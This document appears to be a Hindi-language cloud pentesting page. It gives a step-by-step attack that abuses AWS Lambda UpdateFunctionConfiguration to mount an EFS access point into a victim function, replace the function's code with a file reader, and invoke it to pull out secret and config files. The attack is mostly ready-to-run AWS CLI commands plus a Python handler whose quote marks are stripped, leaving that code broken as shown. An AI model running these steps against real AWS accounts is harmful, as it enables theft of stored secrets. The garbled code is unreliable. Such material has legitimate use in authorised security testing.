# AWS Lambda – EFS Mount Injection via UpdateFunctionConfiguration (Data Theft)

`lambda:UpdateFunctionConfiguration` का दुरुपयोग करके एक मौजूदा EFS Access Point को Lambda से attach करें, फिर ऐसा साधारण कोड deploy करें जो mounted path से फ़ाइलें list/read करे ताकि पहले function द्वारा access न की जा सकने वाली shared secrets/config को exfiltrate किया जा सके।

## आवश्यकताएँ
- पीड़ित account/principal पर Permissions:
- `lambda:GetFunctionConfiguration`
- `lambda:ListFunctions` (to find functions)
- `lambda:UpdateFunctionConfiguration`
- `lambda:UpdateFunctionCode`
- `lambda:InvokeFunction`
- `efs:DescribeMountTargets` (to confirm mount targets exist)
- पर्यावरण मान्यताएँ:
- Target Lambda VPC-enabled है और इसके subnets/SGs EFS mount target SG तक TCP/2049 पर पहुँच सकते हैं (उदा. role में AWSLambdaVPCAccessExecutionRole है और VPC routing इसकी अनुमति देता है)।
- EFS Access Point उसी VPC में होना चाहिए और Lambda subnets के AZs में mount targets होने चाहिए।

## हमला
- वेरिएबल
```
REGION=us-east-1
TARGET_FN=<target-lambda-name>
EFS_AP_ARN=<efs-access-point-arn>
```
1) EFS Access Point को Lambda से जोड़ें
```
aws lambda update-function-configuration \
--function-name $TARGET_FN \
--file-system-configs Arn=$EFS_AP_ARN,LocalMountPath=/mnt/ht \
--region $REGION
# wait until LastUpdateStatus == Successful
until [ "$(aws lambda get-function-configuration --function-name $TARGET_FN --query LastUpdateStatus --output text --region $REGION)" = "Successful" ]; do sleep 2; done
```
2) code को एक सरल रीडर से ओवरराइट करें जो फ़ाइलों की सूची दिखाए और संभावित secret/config फ़ाइल के पहले 200 bytes को निहारता है।
```
cat > reader.py <<PY
import os, json
BASE=/mnt/ht

def lambda_handler(e, c):
out={ls:[],peek:None}
try:
for root, dirs, files in os.walk(BASE):
for f in files:
p=os.path.join(root,f)
out[ls].append(p)
cand = next((p for p in out[ls] if secret in p.lower() or config in p.lower()), None)
if cand:
with open(cand,rb) as fh:
out[peek] = fh.read(200).decode(utf-8,ignore)
except Exception as ex:
out[err]=str(ex)
return out
PY
zip reader.zip reader.py
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://reader.zip --region $REGION
# If the original handler was different, set it to reader.lambda_handler
aws lambda update-function-configuration --function-name $TARGET_FN --handler reader.lambda_handler --region $REGION
until [ "$(aws lambda get-function-configuration --function-name $TARGET_FN --query LastUpdateStatus --output text --region $REGION)" = "Successful" ]; do sleep 2; done
```
3) Invoke करें और डेटा प्राप्त करें
```
aws lambda invoke --function-name $TARGET_FN /tmp/efs-out.json --region $REGION >/dev/null
cat /tmp/efs-out.json
```
आउटपुट में /mnt/ht के अंतर्गत डायरेक्टरी की सूची और EFS से चुनी हुई secret/config फ़ाइल का छोटा पूर्वावलोकन शामिल होना चाहिए।

## प्रभाव
सूचीबद्ध permissions वाले attacker arbitrary in-VPC EFS Access Points को victim Lambda functions में mount करके EFS पर संग्रहीत shared configuration और secrets पढ़कर exfiltrate कर सकते हैं, जिन्हें पहले उस function के लिए inaccessible था।

## सफाई
```
aws lambda update-function-configuration --function-name $TARGET_FN --file-system-configs [] --region $REGION || true
```

